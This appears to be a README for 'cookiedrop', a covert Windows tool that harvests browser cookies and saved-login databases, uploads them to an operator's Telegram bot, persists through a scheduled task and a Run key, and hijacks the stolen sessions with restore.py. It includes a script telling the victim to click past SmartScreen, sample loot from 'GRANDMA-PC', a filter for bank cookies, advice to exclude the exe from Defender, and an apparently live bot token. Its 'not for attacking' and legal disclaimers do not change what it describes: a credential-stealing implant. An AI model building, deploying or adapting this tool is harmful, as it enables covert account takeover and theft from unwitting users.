# Cookie Sync

Two Windows tools for moving browser session cookies off a machine you are allowed
to collect from, and into your hands, on a phone, from anywhere.

`cookiedrop` is the one you want. One file, one double-click, hidden, no Python, no
admin, delivers over Telegram. `cookiesync` is the older LAN-only variant, kept
because it needs no third party.

> **Not built for attacking.** These are collection tools, not exploits. Nothing is
> installed as a service, no privilege escalation, no injection, no persistence beyond
> a user-level scheduled task. If you point it at a machine, you are trusting a
> third-party channel with a live session. See [Security](#security-notes) and
> [Legal](#legal).

---

## Table of contents

1. [What it does](#what-it-does)
2. [How it works](#how-it-works)
3. [Requirements](#requirements)
4. [Repo layout](#repo-layout)
5. [Zero to running](#zero-to-running)
6. [Every command](#every-command)
7. [Receiving cookies and viewing them](#receiving-cookies-and-viewing-them)
8. [Restoring a session](#restoring-a-session)
9. [Config reference](#config-reference)
10. [File reference](#file-reference)
11. [Persistence](#persistence)
12. [Troubleshooting](#troubleshooting)
13. [Security notes](#security-notes)
14. [Limits](#limits)
15. [Uninstall](#uninstall)
16. [FAQ](#faq)
17. [Legal](#legal)

---

## What it does

On the target Windows machine, `cookiedrop`:

1. Detects installed Chromium browsers (Chrome, Edge, Brave, Vivaldi, Opera, Opera GX)
   and Firefox.
2. Closes the ones that are running so their profile databases are unlocked.
3. Relaunches each one **headless** with a DevTools port, on a per-profile basis.
4. Asks Chrome for its own cookies via `Storage.getCookies`. Chrome decrypts them
   itself, which means DPAPI, AES-GCM and Chrome 127+ App-Bound Encryption are all
   sidestepped rather than defeated.
5. Copies the raw cookie database, `Local State`, saved logins and Firefox
   `cookies.sqlite` / `key4.db` as a fallback.
6. Relaunches the browsers it closed, so the user gets their tabs back.
7. Zips the lot with a metadata file (hostname, user, OS, local and public IP,
   timestamp, per-browser counts, errors).
8. Uploads the zip to your Telegram bot, retries three times, falls back to email,
   and messages you the log if everything fails.
9. Registers itself to run again hourly and at every logon, waking the machine from
   sleep. Uploads only when the cookie set actually changed, plus one heartbeat a day.

No console window. No Python. No admin. No ports. No firewall rules. Outbound 443
only, so it works from any network in any city.

## How it works

```
 target PC                                    your phone
 ─────────                                    ─────────
 unzip
   │
   ├─ 1-START-HERE.bat  (hidden)
   │     └─ powershell -WindowStyle Hidden
   │           └─ CookieDrop.ps1
   │
   ├─ close browsers
   ├─ headless relaunch + CDP getAllCookies   ──►  plaintext cookies
   ├─ copy raw DBs
   ├─ restore browsers
   ├─ zip + metadata
   └─ HTTPS POST ──► api.telegram.org ──► Telegram app  ──► you
                        (bot token + your chat id)
```

Transport is the Telegram Bot API. `sendDocument` is a normal HTTPS POST to
`https://api.telegram.org/bot<TOKEN>/sendDocument`. That is why no port forwarding,
no static IP, no VPN and no LAN discovery are involved — the target only ever makes
an outbound connection, the same way a browser does.

The bot is yours. It is created in 30 seconds and its token is the only secret in the
build. The bot can only post to chats that have messaged it, so the token alone does
not let anyone read your history.

## Requirements

**Target machine**

- Windows 10 or 11, x64 or ARM64
- PowerShell 5.1 (present on every Windows since 8)
- At least one supported browser installed
- Outbound HTTPS to `api.telegram.org` (any normal network)
- A logged-in user session (a locked screen is fine; a logged-out machine is not)

**Not required:** admin rights, Python, pip, git, Node, a specific browser version,
inbound ports, firewall changes, or a static IP.

**You**

- A Telegram account
- Five minutes

## Repo layout

| Path | Purpose |
|---|---|
| `cookiedrop/` | Primary tool. Ship `CookieDrop.exe` or `CookieDrop.zip`. |
| `cookiedrop/CookieDrop.ps1` | Harvest and delivery logic. |
| `cookiedrop/RUN.vbs` | Hidden launcher. Zero console. |
| `cookiedrop/1-START-HERE.bat` | What you tell the user to click. |
| `cookiedrop/RUN.bat` | Visible mode, for debugging. |
| `cookiedrop/config.example.json` | Config template. Copy to `config.json`. |
| `cookiedrop/build.ps1` | Produces `CookieDrop.zip` and `CookieDrop.exe`. |
| `cookiedrop/restore.py` | Loads a received `cookies.json` into a live Chrome profile. |
| `cookiesync/` | LAN sender/receiver, no third party. Optional. |

## Zero to running

### Part A — create your bot

1. In Telegram, message **@BotFather**.
2. Send `/newbot`.
3. Give it a name, then a username ending in `bot`. Example: `rajat_drop_bot`.
4. BotFather replies with a token like `9062964327:AAHY-IcMHSp-Z0GO2nvfbPM32DKsUWEud64`.
   Copy it. This is the only secret.
5. Open your new bot's chat and press **Start**. Send it `hi`.

   A bot cannot message you until you have messaged it first. Skipping this is the
   number one reason people get silence.

6. Get your chat id. In a browser, open:

   ```
   https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates
   ```

   Find `"chat":{"id":6417099875,` — the number is your chat id. If the response is
   `{"ok":true,"result":[]}`, you did not press Start in step 5.

### Part B — configure

```powershell
cd cookiedrop
Copy-Item config.example.json config.json
notepad config.json
```

Paste your token and chat id. Leave everything else alone for a first run.

`config.json` is gitignored because it holds live credentials — but `build.ps1`
bundles it into the artifacts, so the person who receives your zip does not edit
anything.

### Part C — build

```powershell
powershell -NoP -Exec Bypass -File .\build.ps1
```

You get `CookieDrop.zip` and `CookieDrop.exe`.

### Part D — test on your own PC first

Always do this before sending it anywhere. Close nothing, just run:

```powershell
powershell -NoP -Exec Bypass -File .\CookieDrop.ps1 -Visible
```

Watch the console. Within about 40 seconds your Telegram chat should receive a
`cookiedrop_<HOSTNAME>_<timestamp>.zip`. Download it and confirm `cookies.json` has
entries. If nothing arrives, read the log it printed and see
[Troubleshooting](#troubleshooting).

### Part E — deploy

Hand over `CookieDrop.exe`. Tell the user, in these words:

> "Double-click this. If Windows says it protected your PC, click More info, then
> Run anyway. It closes itself."

If they get a zip instead, the steps are: right-click, Extract All, open the folder,
double-click `1-START-HERE.bat`.

Then walk away. It re-runs hourly and at every logon, and messages you when the
cookie set changes plus once a day so you know the machine is alive.

## Every command

Build:

```powershell
powershell -NoP -Exec Bypass -File .\build.ps1
```

Visible run, full output:

```powershell
powershell -NoP -Exec Bypass -File .\CookieDrop.ps1 -Visible
```

Harvest but do not send:

```powershell
powershell -NoP -Exec Bypass -File .\CookieDrop.ps1 -Visible -NoSend
```

Leave the user's browsers alone (accepts empty results for anything open):

```powershell
powershell -NoP -Exec Bypass -File .\CookieDrop.ps1 -NoKill
```

Write the zip to a chosen folder:

```powershell
powershell -NoP -Exec Bypass -File .\CookieDrop.ps1 -OutDir C:\temp
```

Inspect the scheduled task:

```bat
schtasks /query /tn CookieDrop /v /fo list
```

Run the task immediately:

```bat
schtasks /run /tn CookieDrop
```

Delete the task:

```bat
schtasks /delete /tn CookieDrop /f
```

Read a log:

```powershell
Get-Content "$env:LOCALAPPDATA\CookieDrop\logs\$(Get-ChildItem "$env:LOCALAPPDATA\CookieDrop\logs" | Sort LastWriteTime -Desc | Select -First 1 -Exp Name)" -Tail 60
```

Allow wake timers so the scheduled task can wake the PC from sleep:

```bat
powercfg -setacvalueindex scheme_current sub_sleep bd3b718a-0680-4d9d-8ab2-e1d2b4ac806d 1
powercfg -setactive scheme_current
```

Check the bot token and chat id are valid:

```powershell
Invoke-RestMethod "https://api.telegram.org/bot<TOKEN>/getMe"
Invoke-RestMethod "https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=ping"
```

Revoke a leaked token:

> @BotFather → `/revoke` → pick the bot.

## Receiving cookies and viewing them

Everything lands in your Telegram chat with the bot, as a document named
`cookiedrop_<HOSTNAME>_<YYYYmmdd_HHMMSS>.zip`.

To read it:

1. Download the zip on a PC.
2. Extract it.
3. Open `cookies.json`.

`cookies.json` is plaintext and looks like this:

```json
{
  "meta": {
    "host": "GRANDMA-PC",
    "user": "gran",
    "public_ip": "203.0.113.44",
    "time": "2026-11-20T09:14:02",
    "counts": "chrome=412 edge=88 firefox=36",
    "errors": ""
  },
  "cookies": {
    "chrome": [
      { "domain": ".github.com", "name": "user_session", "value": "abc123...", "path": "/", "secure": true, "httpOnly": true, "expires": 1790000000 }
    ]
  }
}
```

Grouped by browser and profile, one object per cookie, with domain, name, value, path,
flags and expiry. Search it in any editor, or query it:

```powershell
(Get-Content .\cookies.json -Raw | ConvertFrom-Json).cookies.chrome |
  Where-Object domain -like '*bank*' |
  Format-Table domain, name, expires
```

```bash
jq -r '.cookies | to_entries[] | .key as $b | .value[] | "\($b)\t\(.domain)\t\(.name)"' cookies.json | sort -u
```

`raw/` in the same zip holds `Cookies`, `Local State`, `Login Data`, `Web Data` and
Firefox `cookies.sqlite` / `key4.db`. Those are the browsers' own SQLite files and are
encrypted — useful as a fallback, or to import into a browser, but `cookies.json` is
what you read.

`meta.errors` lists any browser that failed and why. If it is non-empty you know
exactly what was missed.

## Restoring a session

Having the values is one thing; being logged in is another. `restore.py` launches a
throwaway Chrome profile and injects the cookies into it, so you land on the sites
already authenticated.

```powershell
pip install requests websocket-client
python .\restore.py cookies.json
```

It picks the cookies with the longest expiry, launches Chrome against a temp profile
on port 9444, injects them via `Storage.setCookies`, opens a summary page, and leaves
the window open. Close it and the profile is gone.

Options:

```
python restore.py cookies.json --browser edge --start https://github.com
python restore.py cookies.json --keep        # reuse the temp profile next time
python restore.py cookies.json --only github # only cookies whose domain matches
```

Caveats: `__Host-` and `__Secure-` prefixed cookies need the right path and secure
flag, which are preserved, but some sites bind sessions to IP or user agent and will
still ask for 2FA. Expired cookies are skipped.

## Config reference

`cookiedrop/config.json`

| Key | Type | Default | Meaning |
|---|---|---|---|
| `telegram.token` | string | — | Bot token from @BotFather. |
| `telegram.chat_id` | string | — | Your numeric chat id. |
| `email.enabled` | bool | `false` | Turn on the Brevo fallback. |
| `email.api_key` | string | — | Brevo API key. |
| `email.to` / `email.from` | string | — | Must match the verified Brevo sender. |
| `close_browsers` | bool | `true` | Close browsers before harvest. Required for reliable results. |
| `restore_browser` | bool | `true` | Relaunch browsers afterwards. |
| `persist` | bool | `true` | Install autostart. |
| `persist_mode` | string | `"task"` | `task` (hourly + wake) or `run` (logon only). |
| `interval_minutes` | int | `60` | Repeat interval when `persist_mode` is `task`. |
| `only_on_change` | bool | `true` | Skip upload when the cookie hash is unchanged. |
| `heartbeat_hours` | number | `24` | Upload regardless after this long. |
| `always_send` | bool | `false` | Ignore change detection entirely. |
| `debug_port` | int | `9333` | DevTools port. Change if 9333 is taken. |
| `include_raw_dbs` | bool | `true` | Bundle raw SQLite and `Local State`. |
| `keep_local_copy` | bool | `true` | Keep the zip in `%LOCALAPPDATA%\CookieDrop`. |

At least one channel must be configured or the script logs an error and sends nothing.

## File reference

| File | Role |
|---|---|
| `CookieDrop.ps1` | Main logic. `-Visible` `-NoSend` `-NoKill` `-OutDir`. |
| `RUN.vbs` | `wscript` launcher, window style 0, used by the task. |
| `1-START-HERE.bat` | Unblocks files, launches hidden, closes itself. |
| `RUN.bat` | Visible launch for debugging. |
| `build.ps1` | Zips the four runtime files and builds the IExpress SFX. |
| `restore.py` | Injects `cookies.json` into a live Chrome/Edge profile. |
| `receiver.py` | LAN HTTP receiver, writes `dumps/`. |
| `sender.py` | LAN harvest and POST. |
| `install_autostart.bat` | Adds firewall rules and a logon task for the receiver. |

## Persistence

`persist_mode: "task"` registers a user-level scheduled task named `CookieDrop` with:

- a trigger at logon,
- a repeating trigger every `interval_minutes`,
- `WakeToRun` so sleep does not stop it,
- `StartWhenAvailable` so a missed run fires when the machine wakes,
- `IgnoreNew` so overlapping runs cannot fight over the debug port,
- a 30-minute execution limit.

It also writes an HKCU Run key, and re-writes it on every run if something removed it.
`RunLevel` is `Limited`, so no UAC prompt ever appears.

For `WakeToRun` to do anything, wake timers must be enabled once on the machine — see
[Every command](#every-command). On a fully shut-down PC nothing runs until it is
powered on.

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Nothing arrives, no log entries | Script never started | Run `RUN.bat` visibly. |
| `config.json missing` | Shipped the repo instead of the build | Use `CookieDrop.exe` or the built zip. |
| `no delivery channel configured` | Empty token or chat id | Fill `config.json`, rebuild. |
| `401` / `403` from Telegram | Bad token, or never pressed Start | `getMe`, then send the bot a message. |
| `400 chat not found` | Wrong chat id | Re-read `getUpdates`. |
| Telegram `429` | Rate limited | The script honours `retry_after`. Space out runs. |
| `debug port never opened` | Browser already running on that profile | Keep `close_browsers: true`. |
| `0 cookies` for one browser only | Not installed, or profile locked | Check `meta.errors`, run visibly. |
| All browsers `0 cookies` | Enterprise policy blocks remote debugging | Try `--remote-allow-origins=*` variant, or use `cookiesync`. |
| Zip over 45 MB | Huge raw DBs | `include_raw_dbs: false`. |
| `Compress-Archive` fails | Disk full, or a locked file | Free space; the raw copy already tolerates locks. |
| Task exists but never fires | Wake timers off, or PC shut down | Enable wake timers; leave PC on. |
| Defender deletes the exe | Heuristic on `-Exec Bypass` | Add an exclusion, or ship the zip. |
| SmartScreen blocks the exe | Unsigned | More info → Run anyway. |
| Works at home, not at office | Office proxy blocks `api.telegram.org` | Allowlist it, or use the email channel. |

Logs: `%LOCALAPPDATA%\CookieDrop\logs\`. Kept copies: `%LOCALAPPDATA%\CookieDrop\`.
State file for change detection: `%LOCALAPPDATA%\CookieDrop\state.json`.

## Security notes

- **Cookies are bearer credentials.** Whoever holds one is logged in as that user, with
  no password and usually no second factor. A collected zip is as sensitive as a
  password dump.
- **The bot token ships inside the artifact.** Anyone with the exe can post to your bot.
  It cannot read your other chats. Revoke via `/revoke` if a build leaks.
- **Telegram stores the zip.** Cloud chats are on Telegram's servers and your other
  logged-in devices. Use a secret chat if that matters, though documents are awkward there.
- **No decryption keys are extracted.** Because cookies are read through DevTools, no
  DPAPI blob or App-Bound key ever leaves the machine. The raw DBs in the zip are
  encrypted and need `Local State` plus the same Windows user to open.
- **No elevation.** Everything is user-level. Nothing is written outside `%LOCALAPPDATA%`
  and `%TEMP%`.
- **Nothing is installed as a service or driver.** Removal is deleting a task, a Run key,
  and a folder.
- **Full cookie jars are noisy.** Expect a few hundred cookies including trackers.
  Filter on domain rather than assuming everything is interesting.

## Limits

- Cookies are **not** passwords. Changing a password usually invalidates the session,
  and sites with binding will re-challenge.
- The machine must be **powered on and logged in**. Sleep is handled; shutdown is not.
- **Headless cannot read a locked profile.** With `close_browsers: false`, anything
  currently open returns zero rows.
- Some Chromium builds with hardened policy refuse `--remote-debugging-port` entirely.
- Telegram caps documents at 50 MB; the script sheds raw DBs past 45 MB.
- Firefox values are copied encrypted (`key4.db`); only Chromium cookies are returned
  as plaintext.
- Unsigned binary, so SmartScreen warns once.

## Uninstall

On the target:

```bat
schtasks /delete /tn CookieDrop /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CookieDrop /f
rmdir /s /q "%LOCALAPPDATA%\CookieDrop"
```

Nothing else remains.

## FAQ

**Does a zip run itself when extracted?**
No. Windows does not autorun from a zip. `CookieDrop.exe` is one double-click; a zip is
extract-then-click.

**Can it run while the screen is locked?**
Yes. Headless Chrome works on a locked session as long as the user is logged in.

**Will it work over months?**
Yes if the machine stays powered. Hourly runs, wake timers, and a self-repairing task
keep it alive; a daily heartbeat tells you it is still there.

**Does it need admin?**
No. `RunLevel Limited` throughout.

**Will the user notice?**
Their browsers close for about 40 seconds and reopen. There is no console window and no
"controlled by automated software" bar, because headless never shows one.

**Can two people use the same bot?**
Yes. Every dump is tagged with hostname, and separate `state.json` files mean change
detection is per machine.

**How do I get cookies from a browser not in the list?**
Add an entry to `$Browsers` in `CookieDrop.ps1` with its exe and user-data-dir.

## Legal

These tools are for machines you own or have permission to collect from. They do not
bypass authentication, escalate privilege, or exploit anything — they ask a browser for
cookies it already holds and post them somewhere.

Common ground rules:

- Get permission before running on a work or client machine. "Security testing" on
  paper is not permission.
- Prefer a named scope and a written note of what leaves the machine.
- Treat every collected zip as production credentials and delete it when done.
- Rotate sessions afterwards if the machine is not yours.
- A user can revoke everything at once by signing out of their accounts, which is the
  honest recovery path.

Nothing here is a substitute for a real EDR or a real infostealer-grade agent. It is a
small, auditable, 400-line script you can read end to end before trusting it.

## License

MIT. See `LICENSE`.